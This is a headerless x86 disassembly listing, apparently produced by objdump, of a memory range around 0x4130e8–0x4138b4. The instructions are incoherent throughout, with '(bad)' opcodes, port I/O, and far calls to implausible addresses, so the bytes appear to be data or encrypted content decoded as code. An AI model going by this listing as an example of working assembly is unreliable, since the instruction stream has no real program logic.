  4130e8:	test   al,0xcf
  4130ea:	sahf   
  4130eb:	cwde   
  4130ec:	mov    bl,0xe6
  4130ee:	cmp    ah,BYTE PTR [ebp-0x79812bee]
  4130f4:	(bad)  
  4130f5:	shl    BYTE PTR [edi-0x74],cl
  4130f8:	or     DWORD PTR [eax+0x5b],ebp
  4130fb:	stos   BYTE PTR es:[edi],al
  4130fc:	imul   esi,edi,0x34
  4130ff:	ins    BYTE PTR es:[edi],dx
  413100:	inc    esp
  413101:	out    0x36,al
  413103:	jo     0x4130e0
  413105:	ja     0x413176
  413107:	push   0xffffffcf
  413109:	lods   eax,DWORD PTR ds:[esi]
  41310a:	mov    esi,0x5b3cb59f
  41310f:	add    al,0x1f
  413111:	dec    ebp
  413112:	mov    edx,0xb6f88ea5
  413117:	enter  0x1622,0x65
  41311b:	test   BYTE PTR ds:0x3e038efc,bl
  413121:	xchg   ebp,eax
  413122:	mov    ah,BYTE PTR [edi+0x25]
  413125:	mov    bl,cl
  413127:	mov    edx,DWORD PTR [esi+0x814e4e0]
  41312d:	add    BYTE PTR [ecx+edx*2],dh
  413130:	push   cs
  413131:	mov    esi,0x273ebfc8
  413136:	xor    DWORD PTR [edx-0x39],ecx
  413139:	pusha  
  41313a:	push   0xfffffff9
  41313c:	cs out 0xe,eax
  41313f:	jge    0x413131
  413141:	or     BYTE PTR [ebp-0x4f],ah
  413144:	sbb    ecx,DWORD PTR [edx]
  413146:	fmul   DWORD PTR ds:0x3b8ed
  41314c:	push   esi
  41314d:	sbb    bl,BYTE PTR [ebx-0x58]
  413150:	and    bh,0xac
  413153:	setb   BYTE PTR [esi]
  413156:	imul   ebp,edx,0xffffffed
  413159:	push   ebp
  41315a:	(bad)  
  41315b:	fstp   DWORD PTR [eax]
  41315d:	xchg   esi,eax
  41315e:	addr16 enter 0x63f0,0x5a
  413163:	inc    edx
  413164:	pop    ebx
  413165:	out    0xb6,eax
  413167:	push   ebp
  413168:	sbb    eax,0x59f838e0
  41316d:	fldenv [ebx+0x20]
  413170:	fimul  WORD PTR [ebx+0x4ca9ca7f]
  413176:	pop    ebx
  413177:	fadd   QWORD PTR [esi-0x1a]
  41317a:	push   0xbc92f918
  41317f:	outs   dx,BYTE PTR ds:[esi]
  413180:	mov    ds:0x56da4098,al
  413185:	mov    edi,0xe407ca5b
  41318a:	adc    DWORD PTR [edi-0x40e5f8e],edi
  413190:	fdiv   st(5),st
  413192:	pop    eax
  413193:	int    0x54
  413195:	xchg   edx,eax
  413196:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413197:	fcmove st,st(6)
  413199:	not    DWORD PTR [ebp-0x3a]
  41319c:	fldenv [ebp+0x5a]
  41319f:	imul   ebp,DWORD PTR [esp+ebx*1],0xffffffdb
  4131a3:	test   DWORD PTR [ebx-0xc],edi
  4131a6:	and    al,0xb
  4131a8:	aas    
  4131a9:	inc    edi
  4131aa:	dec    ebp
  4131ab:	popf   
  4131ac:	or     al,0x2
  4131ae:	fwait
  4131af:	inc    ebx
  4131b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4131b1:	cdq    
  4131b2:	clc    
  4131b3:	mov    ds,WORD PTR [eax]
  4131b5:	mov    dh,0xac
  4131b7:	jno    0x4131b7
  4131b9:	js     0x4131c0
  4131bb:	test   DWORD PTR [ebx],edi
  4131bd:	sahf   
  4131be:	imul   ebx,DWORD PTR [eax],0x5021f856
  4131c4:	in     al,0xe6
  4131c6:	pop    edx
  4131c7:	int    0x38
  4131c9:	dec    esp
  4131ca:	adc    eax,0xc1cb62b9
  4131cf:	test   DWORD PTR [ecx+0x768989cd],esp
  4131d5:	adc    DWORD PTR [esi-0x4872c7ce],esp
  4131db:	or     eax,0xe17b066b
  4131e0:	nop
  4131e1:	out    0x90,eax
  4131e3:	xchg   ecx,eax
  4131e4:	inc    edx
  4131e5:	sbb    al,0xb7
  4131e7:	pusha  
  4131e8:	pushf  
  4131e9:	push   edi
  4131ea:	call   0xa04c:0x5e3259ab
  4131f1:	es je  0x4131f7
  4131f4:	jae    0x4131d7
  4131f6:	stos   BYTE PTR es:[edi],al
  4131f7:	cdq    
  4131f8:	or     al,dl
  4131fa:	daa    
  4131fb:	xchg   ebp,eax
  4131fc:	iret   
  4131fd:	sahf   
  4131fe:	dec    ebp
  4131ff:	sar    DWORD PTR [edi],0x2d
  413202:	test   bl,0x66
  413205:	bound  eax,QWORD PTR [edx]
  413207:	mov    dh,0xd0
  413209:	repz and DWORD PTR ss:[ecx],edi
  41320d:	iret   
  41320e:	and    DWORD PTR ds:0x991b6dd4,0xffffffad
  413215:	and    bl,bl
  413217:	sub    al,0xd6
  413219:	lock (bad) 
  41321c:	xchg   ecx,eax
  41321d:	sub    eax,0xb8af9e58
  413222:	push   esi
  413223:	jmp    0x4131b4
  413225:	or     al,BYTE PTR [eax+0x4869c27f]
  41322b:	test   BYTE PTR [esi+0x3efcfbcf],ah
  413231:	xchg   ebx,eax
  413232:	mov    edx,edi
  413234:	dec    DWORD PTR gs:[ebp+0x72]
  413238:	mov    ebp,0xc6101ae6
  41323d:	xchg   edi,eax
  41323e:	test   al,0x96
  413241:	fdivr  DWORD PTR [esi-0x27]
  413244:	std    
  413245:	pop    dx
  413247:	inc    eax
  413248:	xlat   BYTE PTR ds:[ebx]
  413249:	adc    DWORD PTR [ecx],esp
  41324b:	je     0x413201
  41324d:	jge    0x4131f7
  41324f:	test   dh,ah
  413251:	inc    ebx
  413252:	test   DWORD PTR [esi],edx
  413254:	aas    
  413255:	dec    edi
  413256:	dec    ecx
  413257:	or     eax,DWORD PTR [esi+0x1]
  41325a:	cmp    ah,BYTE PTR [eax]
  41325c:	adc    esp,ebp
  41325e:	out    dx,al
  41325f:	fadd   st(0),st
  413261:	and    DWORD PTR [eax],ecx
  413263:	call   0x36d4a231
  413268:	aas    
  413269:	leave  
  41326a:	xchg   esp,eax
  41326b:	mov    dh,BYTE PTR ds:0xe581a226
  413271:	out    0x90,al
  413273:	mov    ecx,0x10235dd7
  413278:	cmp    DWORD PTR [eax],ebp
  41327a:	mov    dl,0x2f
  41327c:	aas    
  41327d:	imul   esp,DWORD PTR [edx+0x448bce41],0x1c
  413284:	das    
  413285:	out    0x8,eax
  413287:	pop    esp
  413288:	imul   eax,DWORD PTR [eax-0x17],0xffffffba
  41328c:	adc    BYTE PTR [edi-0x3d],0xfb
  413290:	xchg   ecx,eax
  413291:	push   esp
  413292:	pop    ebx
  413293:	jb     0x413283
  413295:	sbb    ebp,eax
  413297:	sub    ah,al
  413299:	mov    dh,0x3
  41329b:	test   BYTE PTR [edi+ebx*8+0x4a],cl
  41329f:	mov    al,ds:0x53c77f3f
  4132a4:	cli    
  4132a5:	or     DWORD PTR [esi+0x34e772a5],edi
  4132ab:	dec    eax
  4132ac:	pop    ss
  4132ad:	outs   dx,DWORD PTR ds:[esi]
  4132ae:	add    eax,0x6c9eb956
  4132b3:	cs shl ah,1
  4132b6:	pop    edx
  4132b7:	pop    esi
  4132b8:	cmc    
  4132b9:	lds    edi,FWORD PTR ds:0xee525a91
  4132bf:	push   DWORD PTR [ecx]
  4132c1:	in     eax,dx
  4132c2:	sub    eax,0x74e618a1
  4132c7:	inc    eax
  4132c8:	adc    ebp,edx
  4132ca:	mov    esi,0x5a5f2cd9
  4132cf:	mov    al,ds:0xc197d23f
  4132d4:	int3   
  4132d5:	out    0x26,al
  4132d7:	jae    0x4132f9
  4132d9:	arpl   ax,si
  4132db:	and    ch,BYTE PTR [edx-0x2d27e9ae]
  4132e1:	mov    al,0x55
  4132e3:	sub    bh,bl
  4132e5:	xchg   edx,eax
  4132e6:	leave  
  4132e7:	out    0xea,al
  4132e9:	out    0x40,eax
  4132eb:	mov    ds:0xbb1b5d06,al
  4132f0:	adc    bl,dh
  4132f2:	sub    DWORD PTR [eax],esi
  4132f4:	xor    dl,BYTE PTR [edx]
  4132f6:	retf   0xc7cc
  4132f9:	sub    al,0x59
  4132fb:	in     al,dx
  4132fc:	or     DWORD PTR [ecx-0x5f6091e0],0xe55c3bbd
  413306:	aam    0x39
  413308:	fst    DWORD PTR [edx+0x70f78e10]
  41330e:	fnstsw WORD PTR [esp+edi*1+0x2b]
  413312:	fld    TBYTE PTR [ebp+0x4f]
  413315:	dec    esp
  413316:	pop    ebx
  413317:	and    BYTE PTR [eax+0x13],bh
  41331a:	call   0x78500e23
  41331f:	imul   edx,DWORD PTR [ebp+eax*1-0x537d7bb5],0xd3f8a2c
  41332a:	addr16 pop eax
  41332c:	push   0xdf6a58e3
  413331:	out    0x24,eax
  413333:	push   ebx
  413334:	test   ebx,ecx
  413336:	or     ecx,DWORD PTR [esi+0x44d53278]
  41333c:	ds mov ebx,0x5d42d6a7
  413342:	inc    edi
  413343:	mov    edi,0x1f9ada66
  413348:	mov    dh,0xf9
  41334a:	ror    BYTE PTR [edi+0x22f25130],cl
  413350:	dec    edi
  413351:	dec    ebp
  413352:	cwde   
  413353:	es push edx
  413355:	test   BYTE PTR [eax+0x5aea05e4],dh
  41335b:	enter  0x6be2,0xb9
  41335f:	bound  esp,QWORD PTR [edi]
  413361:	mov    ebx,0xe6a25180
  413366:	pop    eax
  413367:	sbb    BYTE PTR [esi+0x3e71e927],dh
  41336d:	fstp   TBYTE PTR [ebx-0x7d]
  413370:	ins    DWORD PTR es:[edi],dx
  413371:	xchg   edx,esp
  413373:	or     al,0xb3
  413375:	(bad)  
  413376:	and    DWORD PTR [esi-0x28],esi
  413379:	dec    edx
  41337a:	push   esp
  41337b:	clc    
  41337c:	mov    BYTE PTR [esi],ch
  41337e:	push   ebp
  41337f:	shr    DWORD PTR [esi],1
  413381:	addr16 and ecx,edi
  413384:	sub    DWORD PTR [edx+eax*2-0xe],edx
  413388:	jbe    0x413332
  41338a:	pop    ebx
  41338b:	bound  edi,QWORD PTR [edi+0x2b]
  41338e:	push   edi
  41338f:	sbb    dh,BYTE PTR [eax-0x367b6e64]
  413395:	ror    edx,1
  413397:	sbb    BYTE PTR [edi],bh
  413399:	test   DWORD PTR [ebp-0x29487737],esi
  41339f:	das    
  4133a0:	mov    ecx,0x6e05cce6
  4133a5:	xor    dh,bh
  4133a7:	sub    al,0x7f
  4133a9:	or     al,BYTE PTR [ebx+0x5abb4ccf]
  4133af:	sub    bl,BYTE PTR [eax]
  4133b1:	xchg   ebx,eax
  4133b2:	fisub  DWORD PTR [eax-0x7a3ddcb0]
  4133b8:	not    DWORD PTR [eax+0x17060156]
  4133be:	xlat   BYTE PTR ds:[ebx]
  4133bf:	lahf   
  4133c0:	lods   eax,DWORD PTR ds:[esi]
  4133c1:	sbb    DWORD PTR [ebp+0x456fe398],ebp
  4133c7:	test   eax,esi
  4133c9:	out    0xa4,eax
  4133cb:	pop    esp
  4133cc:	stos   DWORD PTR es:[edi],eax
  4133cd:	push   esp
  4133ce:	ret    
  4133cf:	out    0x56,al
  4133d1:	inc    eax
  4133d2:	pop    ecx
  4133d3:	cwde   
  4133d4:	add    eax,DWORD PTR [ebp+0x5b]
  4133d7:	scas   al,BYTE PTR es:[edi]
  4133d8:	mov    esi,0xb08aed3e
  4133dd:	mov    eax,ds:0xdfbf855d
  4133e2:	fwait
  4133e3:	mov    al,ds:0x21eb313e
  4133e8:	fist   DWORD PTR [ecx+ecx*1+0x58e6997b]
  4133ef:	mov    dl,0xb1
  4133f1:	mov    bl,0xf3
  4133f3:	push   edi
  4133f4:	mov    edx,esp
  4133f6:	mov    BYTE PTR [edx-0xe],ch
  4133f9:	lods   al,BYTE PTR ds:[esi]
  4133fa:	sub    eax,DWORD PTR [ecx-0x1]
  4133fd:	push   ebp
  4133fe:	pop    edx
  4133ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413400:	push   es
  413401:	jbe    0x413457
  413403:	jmp    0x818fe040
  413408:	push   eax
  413409:	inc    edx
  41340a:	dec    ebx
  41340b:	jecxz  0x4133a2
  41340d:	mov    ds,edx
  41340f:	aam    0x39
  413411:	scas   eax,DWORD PTR es:[edi]
  413412:	pop    edx
  413413:	mov    ch,bh
  413415:	mov    ds:0xe749ac37,al
  41341a:	fdiv   QWORD PTR [edx+edx*2-0x429ea382]
  413421:	sar    esp,cl
  413423:	into   
  413424:	in     al,0x3b
  413426:	pop    edx
  413427:	fsubr  QWORD PTR [ebx+edi*4+0x56]
  41342b:	aaa    
  41342c:	or     BYTE PTR [ebx+0x6c],ch
  41342f:	test   ecx,eax
  413431:	retf   0xe00d
  413434:	mov    eax,ds:0x9e0dc865
  41343a:	add    BYTE PTR [edi+0x2c],ch
  41343d:	out    0x2e,al
  41343f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413440:	shl    DWORD PTR [edi+0x16ee4365],cl
  413446:	lods   eax,DWORD PTR ds:[esi]
  413447:	add    eax,DWORD PTR [ecx*2-0x3fc3af4b]
  41344e:	arpl   WORD PTR [ecx+0x29],cx
  413451:	fs pusha 
  413453:	out    dx,al
  413454:	loop   0x413446
  413456:	shr    BYTE PTR [ecx-0x1a4dac6e],cl
  41345c:	fdiv   DWORD PTR [esi+0x173e705a]
  413462:	nop
  413463:	mov    dh,0x42
  413465:	inc    edx
  413466:	xor    esi,DWORD PTR [ebx-0x36a919a4]
  41346c:	push   0x3c4b2b28
  413471:	hlt    
  413472:	add    esi,DWORD PTR [esi-0x2f]
  413475:	and    ebx,DWORD PTR [ebx-0x5a]
  413478:	cld    
  413479:	test   al,0x6f
  41347b:	add    DWORD PTR [ecx+eax*8],esi
  41347e:	fadd   QWORD PTR [edi+ecx*4+0x237c70d4]
  413485:	cmp    ebx,ebx
  413487:	clc    
  413488:	pop    esi
  413489:	dec    ax
  41348b:	and    BYTE PTR [edi+ecx*2+0xb22e34],ch
  413492:	xchg   ebp,eax
  413493:	test   DWORD PTR [ebp+0x57],edi
  413496:	addr16 jno 0x4134d8
  413499:	jno    0x4134f4
  41349b:	push   0x79
  41349d:	pop    ds
  41349e:	test   DWORD PTR [ebx-0x83b191d],edx
  4134a4:	gs cmp al,0xd
  4134a7:	test   al,0xbc
  4134a9:	inc    esi
  4134aa:	xchg   ebp,eax
  4134ab:	cmp    al,0xfd
  4134ad:	test   eax,0xc5cfb45a
  4134b2:	xlat   BYTE PTR ds:[ebx]
  4134b3:	add    al,0xca
  4134b5:	jb     0x4134ef
  4134b7:	test   DWORD PTR [ebx+0x8],ebx
  4134ba:	dec    ebp
  4134bb:	repnz cmp ch,bl
  4134be:	add    al,0xc5
  4134c0:	enter  0x36b7,0xec
  4134c4:	mov    bh,0xd1
  4134c6:	xchg   ebx,eax
  4134c7:	add    eax,0x85a32928
  4134cc:	push   ds
  4134cd:	lods   eax,DWORD PTR ds:[esi]
  4134ce:	icebp  
  4134cf:	sub    dh,ch
  4134d1:	and    BYTE PTR [edi+0x44631374],bl
  4134d7:	ret    0xd1de
  4134da:	fwait
  4134db:	add    eax,0xfae4f958
  4134e0:	arpl   WORD PTR [ebx],di
  4134e2:	xor    DWORD PTR ds:0x8d9ec4aa,esi
  4134e8:	mov    bh,0xa5
  4134ea:	fwait
  4134eb:	jno    0x4134d0
  4134ed:	ins    DWORD PTR es:[edi],dx
  4134ee:	pop    edx
  4134ef:	(bad)  
  4134f0:	imul   eax,DWORD PTR [esi-0x16072d77],0x55
  4134f7:	test   BYTE PTR [ebx+0x60506750],al
  4134fd:	adc    eax,0x7711cec9
  413502:	jne    0x413506
  413504:	cmp    edx,edi
  413506:	(bad)  
  413507:	lahf   
  413508:	push   es
  413509:	mov    bh,0x48
  41350b:	pop    esp
  41350c:	jae    0x41358d
  41350e:	pop    ebx
  41350f:	repz sbb cl,bh
  413512:	jo     0x413564
  413514:	fst    DWORD PTR ds:[ebx-0x31]
  413518:	adc    esi,edx
  41351a:	mov    esp,0xfcb65edc
  41351f:	test   DWORD PTR [ecx-0x5f],esi
  413522:	leave  
  413523:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413524:	inc    ecx
  413525:	jns    0x4134c5
  413527:	imul   esp,DWORD PTR [ecx],0x1e8409b1
  41352d:	popf   
  41352e:	pop    eax
  413530:	mov    ch,0xfc
  413533:	test   DWORD PTR [edx],edx
  413535:	adc    DWORD PTR ds:0x29833e31,eax
  41353b:	push   esp
  41353c:	jge    0x413526
  41353e:	sbb    ebp,ebp
  413540:	shl    esp,1
  413542:	lods   al,BYTE PTR ds:[esi]
  413543:	xor    al,0x90
  413545:	push   0x4e14d6e5
  41354a:	loope  0x413509
  41354c:	ds jmp 0x43ee60f2
  413552:	idiv   bh
  413554:	aaa    
  413555:	loope  0x4135cf
  413557:	xchg   ecx,eax
  413558:	je     0x41355c
  41355a:	mov    dh,0x5c
  41355c:	ds stos BYTE PTR es:[edi],al
  41355e:	dec    ecx
  41355f:	jle    0x4135a6
  413561:	or     ecx,ebx
  413563:	sbb    eax,0x864fdee7
  413568:	repz adc ch,BYTE PTR [ecx-0x3d18be36]
  41356f:	mov    ch,0xe3
  413571:	or     bl,BYTE PTR [ecx]
  413573:	cli    
  413574:	add    ah,ah
  413576:	icebp  
  413577:	pushf  
  413578:	test   eax,0xa85ced
  41357d:	xlat   BYTE PTR ds:[ebx]
  41357e:	jg     0x4135f3
  413580:	shl    bh,1
  413582:	data16 fisttp QWORD PTR [esi]
  413585:	jecxz  0x4135e9
  413587:	xchg   edx,eax
  413588:	mov    edx,0x8642cf7c
  41358d:	dec    edi
  41358e:	pop    edx
  41358f:	lock dec ecx
  413591:	fistp  DWORD PTR [edx-0x7]
  413594:	out    dx,al
  413595:	xor    dl,ch
  413597:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  413599:	push   eax
  41359a:	in     al,0x85
  41359c:	pusha  
  41359d:	pop    ss
  41359e:	add    BYTE PTR [esi],0x3e
  4135a1:	mov    DWORD PTR [esi],edx
  4135a3:	mov    ds:0xc3e9dfae,eax
  4135a8:	dec    esi
  4135a9:	jle    0x41360f
  4135ab:	adc    ebx,edi
  4135ad:	sti    
  4135ae:	adc    bh,BYTE PTR [ebx]
  4135b0:	ror    BYTE PTR [edx+edi*8+0x6df44c4c],0x82
  4135b8:	jne    0x41353b
  4135ba:	adc    BYTE PTR [eax],al
  4135bc:	das    
  4135bd:	inc    edi
  4135be:	pop    edx
  4135bf:	std    
  4135c0:	mov    eax,0xfc84d039
  4135c5:	and    DWORD PTR [eax-0x4ce1019c],eax
  4135cb:	loopne 0x413647
  4135cd:	dec    ecx
  4135ce:	pop    edx
  4135cf:	push   0xffffffd3
  4135d1:	popf   
  4135d2:	icebp  
  4135d3:	retf   0x268f
  4135d6:	xor    ebp,DWORD PTR [ecx+0x5]
  4135d9:	out    0x2,al
  4135db:	dec    eax
  4135dc:	neg    BYTE PTR [edi+0xc15eea3]
  4135e2:	int    0xc1
  4135e4:	aas    
  4135e5:	fild   QWORD PTR [edx-0x7d]
  4135e8:	or     BYTE PTR [ecx-0x2931ae63],bh
  4135ee:	mov    edi,0xe1264c37
  4135f3:	test   BYTE PTR ds:0x3e648df3,bh
  4135f9:	ja     0x41359f
  4135fb:	inc    esp
  4135fd:	push   esp
  4135fe:	or     ch,0xe2
  413601:	sbb    BYTE PTR [edx+0x54],cl
  413604:	hlt    
  413605:	and    eax,DWORD PTR [ebx]
  413607:	pop    DWORD PTR [edx+0x17682766]
  41360d:	les    edi,FWORD PTR [ecx-0x1d]
  413610:	leave  
  413611:	fistp  DWORD PTR [edx-0x3e]
  413614:	dec    ebp
  413615:	lahf   
  413616:	std    
  413617:	pusha  
  413618:	inc    eax
  413619:	push   esp
  41361a:	or     eax,DWORD PTR [eax+eiz*8-0x3b7f91e4]
  413621:	and    edx,esp
  413623:	dec    edx
  413624:	hlt    
  413625:	ins    BYTE PTR es:[edi],dx
  413626:	pop    edx
  413627:	push   eax
  413628:	add    eax,DWORD PTR [edi]
  41362a:	loopne 0x41365b
  41362c:	sub    eax,0x8a71d6e6
  413631:	out    dx,eax
  413632:	cmp    al,0xdf
  413634:	xchg   edx,eax
  413635:	push   esp
  413636:	inc    ecx
  413637:	stos   BYTE PTR es:[edi],al
  413638:	mov    esp,0x41525a20
  41363d:	jecxz  0x41366b
  41363f:	(bad)  
  413641:	push   ss
  413642:	jns    0x4135ce
  413644:	retf   
  413645:	imul   edi,DWORD PTR [ebx],0xdf0b336e
  41364b:	pop    es
  41364c:	push   ecx
  41364d:	push   eax
  41364e:	or     BYTE PTR [ebp+0x3d],bl
  413651:	popf   
  413652:	pop    edx
  413653:	sub    ch,ah
  413655:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413656:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413657:	pop    edx
  413658:	jnp    0x41363d
  41365a:	jmp    0x3e25:0xc6107f49
  413661:	call   0x91649783
  413666:	xor    DWORD PTR ds:0x505013a4,ecx
  41366c:	mov    cl,0xf2
  41366e:	mov    ebx,0xfb21ae47
  413673:	sbb    BYTE PTR [esi+ebx*4+0x55],0xa0
  413678:	inc    eax
  413679:	add    al,0xe5
  41367b:	test   DWORD PTR [esi+0x38],ebx
  41367e:	mov    eax,0x5b239c36
  413683:	mov    al,ds:0xe79d218
  413688:	shl    esp,0x86
  41368b:	push   ecx
  41368c:	xchg   bh,al
  41368e:	push   ebp
  41368f:	lds    ecx,FWORD PTR [ebx-0x2d85a76a]
  413695:	shl    dh,cl
  413697:	push   es
  413698:	jmp    esp
  41369a:	add    eax,0x82ff3d49
  41369f:	idiv   ecx
  4136a1:	and    al,0x87
  4136a3:	dec    esp
  4136a4:	jle    0x413683
  4136a6:	ror    BYTE PTR [eax+edx*8-0x27790a1e],0x3f
  4136ae:	jle    0x413728
  4136b0:	add    eax,0x2154a43c
  4136b5:	adc    BYTE PTR [ebx+0x8],dl
  4136b8:	cmp    eax,0xcf9876ea
  4136bd:	sbb    al,0xa3
  4136bf:	ficom  DWORD PTR [edx+0x2d]
  4136c2:	jae    0x413648
  4136c4:	xor    esp,DWORD PTR [ecx]
  4136c6:	pop    ds
  4136c7:	fistp  QWORD PTR [edi]
  4136c9:	pop    es
  4136ca:	call   0x86bdf3f9
  4136cf:	sbb    dl,BYTE PTR [ebx]
  4136d1:	out    0xee,eax
  4136d3:	into   
  4136d4:	add    ecx,DWORD PTR [edi+ecx*4+0x51bd9508]
  4136db:	div    BYTE PTR [ebx]
  4136dd:	sub    DWORD PTR [ebx-0x1e],ebx
  4136e0:	fsub   QWORD PTR [edx+0xe]
  4136e3:	lahf   
  4136e4:	scas   al,BYTE PTR es:[edi]
  4136e5:	or     DWORD PTR [ebp-0x65],eax
  4136e8:	mov    edi,0x22261f91
  4136ed:	push   ss
  4136ee:	int    0x9c
  4136f0:	pop    edx
  4136f1:	push   es
  4136f2:	pop    ebx
  4136f3:	pusha  
  4136f4:	jo     0x41372f
  4136f6:	daa    
  4136f7:	fidiv  WORD PTR [ecx+edx*2-0x190c7458]
  4136fe:	nop
  4136ff:	rcl    DWORD PTR [esi-0x6],cl
  413702:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413703:	sar    DWORD PTR [esi],1
  413705:	daa    
  413706:	mov    al,BYTE PTR [ebx]
  413708:	jo     0x4136b7
  41370a:	add    al,0xe9
  41370c:	and    esi,esp
  41370e:	xor    esp,DWORD PTR cs:[esi+0x12016d1d]
  413715:	shl    DWORD PTR [ebx],cl
  413717:	inc    eax
  413718:	lds    ebx,FWORD PTR [edi]
  41371a:	pop    ebx
  41371b:	mov    dh,bh
  41371d:	cwde   
  41371e:	pop    ebx
  41371f:	jmp    0x8af16f9e
  413724:	pop    es
  413725:	daa    
  413726:	addr16 pusha 
  413728:	dec    esp
  413729:	adc    DWORD PTR [ecx+0x5abf0417],ebp
  41372f:	ins    BYTE PTR es:[edi],dx
  413730:	mov    eax,0x744c6565
  413735:	shr    DWORD PTR [ebp-0x394bcf7c],0xa5
  41373c:	aas    
  41373d:	mov    ebp,0x6962b5a6
  413742:	inc    esi
  413743:	scas   al,BYTE PTR es:[edi]
  413744:	cdq    
  413745:	loopne 0x413787
  413747:	push   es
  413748:	inc    ebp
  413749:	dec    ecx
  41374a:	cs cdq 
  41374c:	iret   
  41374d:	ret    0x33c7
  413750:	and    ah,BYTE PTR [ebp-0x19d1ee8a]
  413756:	jg     0x413700
  413758:	test   DWORD PTR [ebp-0x2d495b77],esi
  41375e:	or     al,0x84
  413760:	fidivr WORD PTR [eax-0xb]
  413763:	popa   
  413764:	ds dec ebp
  413766:	sti    
  413767:	fld    DWORD PTR fs:[edx-0x11]
  41376b:	mul    BYTE PTR [edx+ebx*4+0x26cea116]
  413772:	iret   
  413773:	cmc    
  413774:	mov    ah,0x67
  413776:	test   DWORD PTR ss:[edx-0x2b],ebx
  41377a:	lahf   
  41377b:	adc    al,0x5e
  41377d:	sahf   
  41377e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41377f:	cs inc ebp
  413781:	xchg   ecx,eax
  413782:	inc    esp
  413783:	mov    cs,WORD PTR [ebx-0x19]
  413786:	fwait
  413787:	sbb    ecx,DWORD PTR [edi+ebx*4]
  41378a:	loope  0x4137e7
  41378c:	adc    BYTE PTR [edx],al
  41378e:	call   0xa908:0x5d65ed8c
  413795:	push   ds
  413796:	pop    ebx
  413797:	pop    esi
  413798:	aas    
  413799:	xchg   ebp,eax
  41379a:	ret    0xa9e5
  41379d:	aad    0x42
  41379f:	mov    bl,bh
  4137a1:	sbb    ecx,ebx
  4137a3:	(bad)  
  4137a4:	sub    bl,cl
  4137a6:	fimul  WORD PTR [edx+0x437466cb]
  4137ac:	mov    ah,0x7c
  4137ae:	mov    esp,0x6bdd3e78
  4137b3:	mov    edi,DWORD PTR [ebx+0x4f]
  4137b6:	inc    edx
  4137b7:	(bad)  
  4137b8:	xchg   ebp,eax
  4137b9:	out    0xa,al
  4137bb:	rol    BYTE PTR [edx],1
  4137bd:	test   dl,ah
  4137bf:	hlt    
  4137c0:	jo     0x41376c
  4137c2:	in     eax,dx
  4137c3:	jo     0x41382a
  4137c5:	cmp    bl,BYTE PTR [ebp-0x12]
  4137c8:	dec    edi
  4137c9:	push   es
  4137ca:	dec    edi
  4137cb:	dec    ecx
  4137cc:	mov    bl,BYTE PTR [esp+edi*1-0x3628c58a]
  4137d3:	fnstsw WORD PTR [edx+0x1c]
  4137d6:	xchg   BYTE PTR [edi+edi*8+0x45],dl
  4137da:	fild   QWORD PTR [edx]
  4137dc:	aas    
  4137dd:	pop    gs
  4137df:	mov    cl,0x32
  4137e1:	mov    edi,0xe710fdfb
  4137e6:	repnz loope 0x413842
  4137e9:	jns    0x413794
  4137eb:	mov    eax,0xc570a08f
  4137f0:	cdq    
  4137f1:	out    0xca,eax
  4137f3:	pop    eax
  4137f4:	pushf  
  4137f5:	and    BYTE PTR [ebx],dl
  4137f7:	push   ebp
  4137f8:	(bad)  
  4137fa:	push   0x2bbc81bf
  4137ff:	ss inc ebp
  413801:	mov    esi,0xe7d18435
  413806:	das    
  413807:	xchg   edx,eax
  413808:	or     DWORD PTR [esi+ebp*1-0x27188cce],edx
  41380f:	inc    eax
  413810:	jge    0x41384a
  413812:	sub    al,0x52
  413814:	mov    gs,WORD PTR [ebp+0x7bdf5270]
  41381a:	pop    ebx
  41381b:	cmp    BYTE PTR [edx+0xe5f04eb],0x12
  413822:	ins    BYTE PTR es:[edi],dx
  413823:	test   DWORD PTR [ebx+ecx*4],esi
  413826:	or     ch,BYTE PTR [ebp-0x731b66c1]
  41382c:	pusha  
  41382d:	out    dx,eax
  41382e:	(bad)  
  41382f:	jmp    0x95e5:0x2018e7ad
  413836:	push   esi
  413837:	pop    ds
  413838:	data16 aas 
  41383a:	loopne 0x413861
  41383c:	cwde   
  41383d:	pushf  
  41383e:	cs repnz inc edx
  413841:	test   eax,0x9b5985c4
  413846:	inc    edi
  413847:	call   0x8e2e9e9c
  41384c:	xchg   ecx,eax
  41384d:	out    0x9,al
  41384f:	(bad)  
  413850:	mov    dh,0x45
  413852:	jg     0x41381b
  413854:	pop    edx
  413855:	pusha  
  413856:	inc    edx
  413857:	cmp    ah,BYTE PTR [eax]
  413859:	out    0x4e,al
  41385b:	mov    DWORD PTR [edi-0x3e],esi
  41385e:	daa    
  41385f:	adc    eax,0xc514f39
  413864:	pusha  
  413865:	sti    
  413866:	fs jle 0x4138a7
  413869:	push   esp
  41386a:	out    0x23,al
  41386c:	(bad)  
  41386d:	xchg   ebp,eax
  41386e:	jo     0x4138bb
  413870:	and    bh,dl
  413872:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413873:	test   DWORD PTR [ecx+0x3f65e511],eax
  413879:	xor    eax,0x270c9501
  41387e:	pop    ds
  41387f:	popf   
  413880:	retf   
  413881:	xchg   esi,eax
  413882:	sub    cl,bh
  413884:	lahf   
  413885:	shl    BYTE PTR [ebx],cl
  413887:	call   0x8a47cdf0
  41388c:	xor    DWORD PTR [ebx+edx*4-0x58e0db4a],esp
  413893:	fcmove st,st(7)
  413895:	int3   
  413896:	frstor [ebx+ebx*8]
  413899:	jae    0x4138f5
  41389b:	fcmovbe st,st(5)
  41389d:	mov    ds:0xf5346ade,al
  4138a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4138a3:	xor    al,0xb
  4138a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4138a6:	pop    ebx
  4138a7:	lock cmp DWORD PTR [eax+0x52c416c3],ebp
  4138ae:	pop    edx
  4138af:	mov    dl,0x3b
  4138b1:	outs   dx,BYTE PTR ds:[esi]
  4138b2:	lods   al,BYTE PTR ds:[esi]
  4138b3:	xchg   esi,eax
  4138b4:	and    BYTE PTR [eax],0x1b
